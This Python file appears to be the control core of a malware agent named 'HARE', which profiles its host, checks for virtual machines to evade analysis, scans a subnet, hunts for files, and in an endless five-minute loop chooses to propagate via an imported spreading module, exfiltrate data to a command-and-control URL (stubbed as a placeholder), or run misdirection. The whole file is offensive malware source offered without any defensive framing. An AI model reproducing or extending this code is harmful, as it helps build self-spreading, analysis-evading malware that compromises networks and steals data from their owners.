import logging
import time
from enum import Enum, auto

class Goal(Enum):
    """The primary goals the HARE can pursue."""
    PROPAGATE = auto()
    EXFILTRATE = auto()
    MISDIRECT = auto()
    DORMANT = auto()

class HareAgent:
    def __init__(self, c2_url, initial_subnet="192.168.1.", payload_path=None):
        self.c2_url = c2_url
        self.subnet = initial_subnet
        self.payload_path = payload_path
        self.current_goal = Goal.DORMANT
        self.environment_profile = {}
        logging.info("HARE Agent Initialized.")

    def run_situational_awareness(self):
        """
        Gathers intelligence about the current environment to inform decisions.
        """
        logging.info("HARE: Running situational awareness protocols...")
        from modules.anti_analysis import is_virtual_machine
        from modules.scanner import intelligent_scan
        from modules.discovery import discover_files

        self.environment_profile['is_vm'] = is_virtual_machine()
        self.environment_profile['network_targets'] = intelligent_scan(self.subnet)
        self.environment_profile['valuable_files'] = discover_files('image', '.')

        logging.info(f"HARE: Environment profile updated.")

    def select_goal(self):
        """
        Analyzes the environment profile to select the most appropriate goal.
        """
        logging.info("HARE: Analyzing environment and selecting goal...")

        if self.environment_profile.get('is_vm', False):
            self.current_goal = Goal.MISDIRECT
            return

        if len(self.environment_profile.get('network_targets', [])) > 1:
            self.current_goal = Goal.PROPAGATE
            return

        if self.environment_profile.get('valuable_files'):
            self.current_goal = Goal.EXFILTRATE
            return

        self.current_goal = Goal.DORMANT

    def execute_action(self):
        """
        Executes the action corresponding to the current goal.
        """
        logging.info(f"HARE: Executing action for goal: {self.current_goal.name}")

        if self.current_goal == Goal.PROPAGATE:
            from modules.ape import unleash_ape
            unleash_ape(self.c2_url, self.subnet)

        elif self.current_goal == Goal.EXFILTRATE:
            # from modules.ace import ace_exfiltrate # To be re-implemented
            logging.info("HARE: Exfiltrating data (placeholder)...")

        elif self.current_goal == Goal.MISDIRECT:
            logging.info("HARE: Running misdirection tactics...")

        elif self.current_goal == Goal.DORMANT:
            logging.info("HARE: Entering dormant state.")

    def run(self):
        """The main loop for the HARE agent."""
        logging.info("--- HARE Engine Unleashed ---")
        while True:
            self.run_situational_awareness()
            self.select_goal()
            self.execute_action()

            logging.info("HARE: Cycle complete. Sleeping for 5 minutes...")
            time.sleep(300)

def unleash_hare(c2_url, subnet, payload_path):
    """Entry point to start the HARE engine."""
    agent = HareAgent(c2_url, subnet, payload_path)
    agent.run()